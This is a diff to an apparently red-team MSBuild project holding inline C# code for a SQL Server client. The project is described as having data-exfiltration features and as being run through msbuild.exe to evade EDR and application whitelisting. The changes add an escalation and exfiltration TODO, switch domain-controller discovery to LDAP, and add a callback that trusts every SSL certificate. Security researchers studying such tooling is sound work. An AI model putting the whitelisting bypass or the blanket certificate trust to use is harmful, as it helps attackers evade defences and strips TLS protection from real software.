@@ -1,7 +1,7 @@
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
 	<!--
 		Author: Scott Sutherland (@_nullbind), NetSPI 2020
-		Version: 1.0 
+		Version: 0.99 (work in progress) 
 		Description: 
 		This is a simple C# SQL Server client console with data exfiltration capabilities 
 		that can be run through msbuild to avoid EDR/White listing/Etc.
@@ -17,7 +17,12 @@
 			C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe file.csproj
 			
 		Note: This execution technique is entirely based on Casey Smith magic.
-		http://subt0x11.blogspot.com/2018/11/microsoft-build-engine-compromise-part_13.html		
+		http://subt0x11.blogspot.com/2018/11/microsoft-build-engine-compromise-part_13.html
+		
+		TODO
+		- *discover -> *check access -> *run query -> Escalation -> oscmd + data access - > exfiltration 
+		- msbuild + sharp.exe + powershell 
+		- add discover local 
 	-->
 	<Target Name="SQLClient">
 		<SQLClientExample />
@@ -50,6 +55,7 @@
 		using System.Net.NetworkInformation;	
 		using System.Net;					
 		using System.DirectoryServices;		
+		using System.DirectoryServices.ActiveDirectory;	
 		
 		public class SQLClientExample :  Task, ITask
 		{
@@ -348,11 +354,21 @@ EXAMPLE SCRIPT EXECUTION
 				mytable.Columns.Add("SamAccountName");						
 				// mytable.Columns.Add("servicePrincipalName");
 
-				// Setup LDAP query
-				string MyDC = System.Environment.GetEnvironmentVariable("logonserver").Replace("\\\\","");	
-				DirectoryEntry RootDirEntry = new DirectoryEntry("LDAP://" + MyDC + ":636",null,null,AuthenticationTypes.SecureSocketsLayer);
+				// Setup LDAP query								
+                Domain DomainInfo = Domain.GetCurrentDomain();
+                string MyDC = DomainInfo.PdcRoleOwner.Name;
+				
+				//DirectoryEntry RootDirEntry = new DirectoryEntry("LDAP://" + MyDC + ":636",null,null,AuthenticationTypes.SecureSocketsLayer);
+				//DirectoryEntry RootDirEntry = new DirectoryEntry("LDAP://" + MyDC + ":636",null,null,AuthenticationTypes.Secure);
+				DirectoryEntry RootDirEntry = new DirectoryEntry("LDAP://" + MyDC + ":389",null,null);
 				RootDirEntry.AuthenticationType = AuthenticationTypes.Secure;	
 				Console.WriteLine("\nQuerying " + MyDC + " domain controller for SQL Server SPNs.\n");
+				
+				// Trust all SSL certs
+				ServicePointManager.ServerCertificateValidationCallback = delegate { return true; }; 
+
+				// Turn on TLS 1.1 and 1.2 without affecting other protocols:
+				ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
 				
 				try{
 					using (DirectorySearcher ds = new DirectorySearcher(RootDirEntry))
@@ -461,8 +477,12 @@ EXAMPLE SCRIPT EXECUTION
 					}
 				
 					Console.WriteLine("\n" + mytable.Rows.Count + " instances found.");				
-				}catch{
-					Console.WriteLine("Unable to connect to " + MyDC + ".");					
+				}catch(Exception ex){
+					Console.WriteLine("Unable to connect to " + MyDC + ".");
+					if(VerboseG.Equals("enabled"))
+					{
+						Console.WriteLine("\n" + ex.ToString() + "\n");
+					}					
 				}				
 				Console.Write("\nSQLCLIENT> ");	
 				return null;				
@@ -1557,10 +1577,10 @@ EXAMPLE SCRIPT EXECUTION
 				}	
 				return null;	
 			}				
-            			
+			
 			// ------------------------------------------------------------
-            		// FUNCTION: LISTLOGINS
-            		// ------------------------------------------------------------				
+			// FUNCTION: LISTLOGINS
+			// ------------------------------------------------------------		
 			public static string ListLogins()
 			{
 				CheckQueryReady();
